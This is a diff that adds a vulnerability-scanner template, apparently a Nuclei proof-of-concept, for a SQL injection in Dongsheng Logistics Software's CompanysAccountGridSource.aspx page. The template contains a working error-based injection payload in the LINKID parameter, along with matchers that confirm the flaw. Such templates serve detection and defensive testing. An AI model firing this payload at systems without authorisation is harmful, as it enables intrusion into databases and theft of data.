@@ -1,0 +1,25 @@
+id: poc-dongshengsoft-companysaccountgridsource-sqli
+info:
+  name: 东胜物流软件 CompanysAccountGridSource SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Dongsheng Logistics Software's CompanysAccountGridSource page allows attackers to execute arbitrary SQL commands.
+variables:
+  t1: '{{rand_int(1,100000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/Shipping/CompanysAccountGridSource.aspx?LINKID=-1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%20--&read=exist'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [500]
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
